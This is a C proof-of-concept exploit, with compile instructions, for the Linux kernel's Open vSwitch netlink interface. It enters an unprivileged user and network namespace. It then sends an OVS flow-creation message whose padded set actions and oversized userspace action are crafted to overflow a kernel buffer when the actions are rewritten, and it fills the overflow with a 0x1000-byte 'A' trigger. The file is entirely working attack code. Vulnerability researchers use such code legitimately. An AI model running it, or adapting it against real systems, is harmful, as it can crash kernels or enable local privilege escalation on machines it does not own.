// gcc poc.c -o poc -static -no-pie -Werror -s -Os -Wno-unused-result
#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/if_packet.h>
#include <linux/netlink.h>
#include <linux/openvswitch.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#define logd(fmt, ...) dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...) dprintf(2, "[+] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...) dprintf(2, "[!] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...) dprintf(2, "[-] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)

struct ovs_attr {
    uint16_t type;
    void *data;
    uint16_t len;
};

#define GENLMSG_DATA(glh) ((void *)(((char *)glh) + GENL_HDRLEN))
#define NLA_DATA(nla) ((void *)((char *)(nla) + NLA_HDRLEN))
#define NLA_NEXT(nla, len) ((len) -= NLA_ALIGN((nla)->nla_len), \
                            (struct nlattr *)(((char *)(nla)) + NLA_ALIGN((nla)->nla_len)))
#define NLA_OK(nla, len) ((len) >= (int)sizeof(struct nlattr) &&     \
                          (nla)->nla_len >= sizeof(struct nlattr) && \
                          (nla)->nla_len <= (len))

int nla_attr_size(int payload) {
    return NLA_HDRLEN + payload;
}

int nla_total_size(int payload) {
    return NLA_ALIGN(nla_attr_size(payload));
}

int genlmsg_open(void) {
    int sockfd;
    struct sockaddr_nl nladdr;
    int ret;

    sockfd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
    if (sockfd < 0) {
        loge("socket: %m");
        return -1;
    }

    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;
    nladdr.nl_pid = getpid();
    // nladdr.nl_groups = 0xffffffff;

    ret = bind(sockfd, (struct sockaddr *)&nladdr, sizeof(nladdr));
    if (ret < 0) {
        loge("bind: %m");
        close(sockfd);
        return -1;
    }

    return sockfd;
}

void *genlmsg_alloc(int *size) {
    unsigned char *buf;
    int len;

    /*
     * attribute len
     * attr len = (nla_hdr + pad) + (payload(user data) + pad)
     */
    len = nla_total_size(*size);
    /*
     * family msg len,
     * but actually we have NOT custom family header
     * family msg len = family_hdr + payload(attribute)
     */
    len += 0;
    /*
     * generic netlink msg len
     * genlmsg len = (genlhdr + pad) + payload(family msg)
     */
    len += GENL_HDRLEN;
    /*
     * netlink msg len
     * nlmsg len = (nlmsghdr + pad) + (payload(genlmsg) + pad)
     */
    len = NLMSG_SPACE(len);

    buf = malloc(len);
    if (!buf)
        return NULL;

    memset(buf, 0, len);
    *size = len;

    return buf;
}

void genlmsg_free(void *buf) {
    if (buf) {
        free(buf);
    }
}

int genlmsg_send(int sockfd, unsigned short nlmsg_type, unsigned int nlmsg_pid,
                 unsigned char genl_cmd, unsigned char genl_version,
                 unsigned short nla_type, const void *nla_data, unsigned int nla_len) {
    struct nlmsghdr *nlh;   // netlink message header
    struct genlmsghdr *glh; // generic netlink message header
    struct nlattr *nla;     // netlink attribute header

    struct sockaddr_nl nladdr;
    unsigned char *buf;
    int len;

    int count;
    int ret;

    if ((nlmsg_type == 0) || (!nla_data) || (nla_len <= 0)) {
        return -1;
    }

    len = nla_len;
    buf = genlmsg_alloc(&len);
    if (!buf)
        return -1;

    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = len;
    nlh->nlmsg_type = nlmsg_type;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = nlmsg_pid;

    glh = (struct genlmsghdr *)NLMSG_DATA(nlh);
    glh->cmd = genl_cmd;
    glh->version = genl_version;

    nla = (struct nlattr *)GENLMSG_DATA(glh);
    nla->nla_type = nla_type;
    nla->nla_len = nla_attr_size(nla_len);
    memcpy(NLA_DATA(nla), nla_data, nla_len);

    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;

    count = 0;
    ret = 0;
    do {
        ret = sendto(sockfd, &buf[count], len - count, 0,
                     (struct sockaddr *)&nladdr, sizeof(nladdr));
        if (ret < 0) {
            if (errno != EAGAIN) {
                count = -1;
                goto out;
            }
        } else {
            count += ret;
        }
    } while (count < len);

out:
    genlmsg_free(buf);
    return count;
}

int genlmsg_recv(int sockfd, unsigned char *buf, unsigned int len) {
    struct sockaddr_nl nladdr;
    struct msghdr msg;
    struct iovec iov;

    int ret;

    nladdr.nl_family = AF_NETLINK;
    nladdr.nl_pid = getpid();
    // nladdr.nl_groups = 0xffffffff;

    iov.iov_base = buf;
    iov.iov_len = len;

    msg.msg_name = (void *)&nladdr;
    msg.msg_namelen = sizeof(nladdr);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    ret = recvmsg(sockfd, &msg, 0);
    ret = ret > 0 ? ret : -1;
    return ret;
}

int genlmsg_dispatch(struct nlmsghdr *nlmsghdr, unsigned int nlh_len,
                     int nlmsg_type, int nla_type, unsigned char *buf, int *len) {
    struct nlmsghdr *nlh;
    struct genlmsghdr *glh;
    struct nlattr *nla;
    int nla_len;

    int l;
    int i;
    int ret = -1;

    if (!nlmsghdr || !buf || !len)
        return -1;

    if (nlmsg_type && (nlmsghdr->nlmsg_type != nlmsg_type)) {
        return -1;
    }

    for (nlh = nlmsghdr; NLMSG_OK(nlh, nlh_len); nlh = NLMSG_NEXT(nlh, nlh_len)) {
        /* The end of multipart message. */
        if (nlh->nlmsg_type == NLMSG_DONE) {
            // printf("get NLMSG_DONE\n");
            ret = 0;
            break;
        }

        if (nlh->nlmsg_type == NLMSG_ERROR) {
            // printf("get NLMSG_ERROR\n");
            ret = -1;
            break;
        }

        glh = (struct genlmsghdr *)NLMSG_DATA(nlh);
        nla = (struct nlattr *)GENLMSG_DATA(glh); // the first attribute
        nla_len = nlh->nlmsg_len - GENL_HDRLEN;   // len of attributes
        for (i = 0; NLA_OK(nla, nla_len); nla = NLA_NEXT(nla, nla_len), ++i) {
            /* Match the family ID, copy the data to user */
            if (nla_type == nla->nla_type) {
                l = nla->nla_len - NLA_HDRLEN;
                *len = *len > l ? l : *len;
                memcpy(buf, NLA_DATA(nla), *len);
                ret = 0;
                break;
            }
        }
    }

    return ret;
}

int genlmsg_get_family_id(int sockfd, const char *family_name) {
    void *buf;
    int len;
    __u16 id;
    int l;
    int ret;

    ret = genlmsg_send(sockfd, GENL_ID_CTRL, 0, CTRL_CMD_GETFAMILY, 1,
                       CTRL_ATTR_FAMILY_NAME, family_name, strlen(family_name) + 1);
    if (ret < 0)
        return -1;

    len = 256;
    buf = genlmsg_alloc(&len);
    if (!buf)
        return -1;

    len = genlmsg_recv(sockfd, buf, len);
    if (len < 0)
        return len;

    id = 0;
    l = sizeof(id);
    genlmsg_dispatch((struct nlmsghdr *)buf, len, 0, CTRL_ATTR_FAMILY_ID, (unsigned char *)&id, &l);

    genlmsg_free(buf);

    return id > 0 ? id : -1;
}

void genlmsg_close(int sockfd) {
    if (sockfd >= 0) {
        close(sockfd);
    }
}

int ovsmsg_send(int sockfd, uint16_t nlmsg_type, uint32_t nlmsg_pid,
                uint8_t genl_cmd, uint8_t genl_version,
                int dp_ifindex, struct ovs_attr *ovs_attrs, int attr_num) {
    struct nlmsghdr *nlh;   // netlink message header
    struct genlmsghdr *glh; // generic netlink message header
    struct nlattr *nla;     // netlink attribute header
    struct ovs_header *ovh; // ovs user header

    struct sockaddr_nl nladdr;
    unsigned char *buf;
    int len = 0;

    int count;
    int ret;

    for (int i = 0; i < attr_num; i++) {
        len += nla_total_size(ovs_attrs[i].len);
    }

    buf = genlmsg_alloc(&len);
    if (!buf) {
        return -1;
    }

    nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_len = len;
    nlh->nlmsg_type = nlmsg_type;
    nlh->nlmsg_flags = NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = nlmsg_pid;

    glh = (struct genlmsghdr *)NLMSG_DATA(nlh);
    glh->cmd = genl_cmd;
    glh->version = genl_version;

    ovh = (struct ovs_header *)GENLMSG_DATA(glh);
    ovh->dp_ifindex = dp_ifindex;
    char *offset = GENLMSG_DATA(glh) + 4;
    for (int i = 0; i < attr_num; i++) {
        nla = (struct nlattr *)(offset);
        nla->nla_type = ovs_attrs[i].type;
        nla->nla_len = nla_attr_size(ovs_attrs[i].len);
        memcpy(NLA_DATA(nla), ovs_attrs[i].data, ovs_attrs[i].len);
        offset += nla_total_size(ovs_attrs[i].len);
    }
    memset(&nladdr, 0, sizeof(nladdr));
    nladdr.nl_family = AF_NETLINK;

    count = 0;
    ret = 0;
    do {
        ret = sendto(sockfd, &buf[count], len - count, 0,
                     (struct sockaddr *)&nladdr, sizeof(nladdr));
        if (ret < 0) {
            if (errno != EAGAIN) {
                count = -1;
                goto out;
            }
        } else {
            count += ret;
        }
    } while (count < len);

out:
    genlmsg_free(buf);
    return count;
}

#define ELEM_CNT(x) (sizeof(x) / sizeof(x[0]))

int nl_sockfd = -1;
int dp_family_id = 1;
int flow_family_id = -1;

void init_unshare() {
    int fd;
    char buff[0x100];

    // strace from `unshare -Ur xxx`
    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    fd = open("/proc/self/setgroups", O_WRONLY);
    snprintf(buff, sizeof(buff), "deny");
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getuid());
    write(fd, buff, strlen(buff));
    close(fd);

    fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(buff, sizeof(buff), "0 %d 1", getgid());
    write(fd, buff, strlen(buff));
    close(fd);
}

void bind_cpu() {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void init_nl_sock() {
    nl_sockfd = genlmsg_open();
    if (nl_sockfd < 0) {
        die("open sock failed");
    }

    dp_family_id = genlmsg_get_family_id(nl_sockfd, OVS_DATAPATH_FAMILY);
    if (dp_family_id < 0) {
        die("get dp_family_id failed");
    }

    flow_family_id = genlmsg_get_family_id(nl_sockfd, OVS_FLOW_FAMILY);
    if (flow_family_id < 0) {
        die("get flow_family_id failed");
    }

    if (dp_family_id == flow_family_id) {
        // like some bug, but I don't know how to solve it :(
        logw("id are same, retry ...");
        genlmsg_close(nl_sockfd);
        init_nl_sock();
    }
}

void do_init() {
    bind_cpu();
    init_unshare();
    init_nl_sock();
}

void trigger_vuln(void *vuln_data, size_t vuln_size) {
    struct nlattr *key_nla;

    struct ovs_key_ethernet eth_key;
    memcpy(eth_key.eth_src, "\x01\x02\x03\x04\x05", 6);
    memcpy(eth_key.eth_dst, "\x05\x04\x03\x02\x01", 6);

    struct ovs_key_ipv4 ipv4_key = {
        .ipv4_src = 0x12345678,
        .ipv4_dst = 0x87654321,
        .ipv4_proto = 1,
        .ipv4_tos = 1,
        .ipv4_ttl = 1,
        .ipv4_frag = 2,
    };

    struct ovs_attr key_attrs[] = {
        {OVS_KEY_ATTR_ETHERNET, &eth_key, sizeof(struct ovs_key_ethernet)},
        {OVS_KEY_ATTR_ETHERTYPE, "\x08\x00", 2},
        {OVS_KEY_ATTR_IPV4, &ipv4_key, sizeof(struct ovs_key_ipv4)},
    };

    int key_size = 0;
    for (int i = 0; i < ELEM_CNT(key_attrs); i++) {
        key_size += nla_total_size(key_attrs[i].len);
    }

    key_nla = (struct nlattr *)malloc(key_size);
    void *key_offset = key_nla;
    for (int i = 0; i < ELEM_CNT(key_attrs); i++) {
        struct nlattr *nla = key_offset;
        nla->nla_type = key_attrs[i].type;
        nla->nla_len = nla_attr_size(key_attrs[i].len);
        memcpy(NLA_DATA(nla), key_attrs[i].data, key_attrs[i].len);
        key_offset += nla_total_size(key_attrs[i].len);
    }

    char *action_nla = (char *)malloc(0x10000);
    if (!action_nla) {
        die("malloc: %m");
    }

    // 0x14 -> 0x20 (+0xc)
    const int ori_size = 0x14;
    const int rewrite_size = 0x1c;
    const int header_size = 0x1c;

    int pad_action_cnt = (0xfc00 - header_size) / (4 + rewrite_size);

    int i = 0;
    for (i = 0; i < pad_action_cnt; i++) {
        struct nlattr *ptr = (struct nlattr *)(action_nla + i * ori_size);
        ptr->nla_len = ori_size;
        ptr->nla_type = OVS_ACTION_ATTR_SET;

        ptr = NLA_DATA(ptr);
        ptr->nla_len = 0x10;
        ptr->nla_type = OVS_KEY_ATTR_ETHERNET;

        ptr = NLA_DATA(ptr);
        memset(ptr, 'k', 0xc);
    }

    const uint32_t padding_size = 0x10000 - (header_size + (4 + rewrite_size) * pad_action_cnt);
    uint16_t evil_size = padding_size + vuln_size;
    {
        struct nlattr *ptr = (struct nlattr *)(action_nla + i * ori_size);
        ptr->nla_len = evil_size;
        ptr->nla_type = OVS_ACTION_ATTR_USERSPACE;

        // sub attr1
        struct nlattr *sub_ptr = NLA_DATA(ptr);
        sub_ptr->nla_len = 8;
        sub_ptr->nla_type = OVS_USERSPACE_ATTR_PID;
        char *sub_buff = NLA_DATA(sub_ptr);
        memset(sub_buff, 'A', 4);

        char *padding_ptr = ((char *)sub_ptr) + NLA_ALIGN(sub_ptr->nla_len);
        memset(padding_ptr, 'x', padding_size - (padding_ptr - (char *)ptr));

        memcpy((char *)action_nla + i * ori_size + padding_size, vuln_data, vuln_size);
    }

    struct ovs_attr ovs_attrs[] = {
        {OVS_FLOW_ATTR_KEY, key_nla, key_size},
        {OVS_FLOW_ATTR_ACTIONS, action_nla, nla_total_size(0xff00)},
    };

    ovsmsg_send(nl_sockfd, flow_family_id, 0, OVS_FLOW_CMD_NEW, OVS_FLOW_VERSION,
                0, ovs_attrs, ELEM_CNT(ovs_attrs));
}

int main(int argc, char **argv) {
    do_init();

    char vuln_buf[0x1000];
    memset(vuln_buf, 'A', 0x1000);
    trigger_vuln(&vuln_buf, sizeof(vuln_buf));
    return 0;
}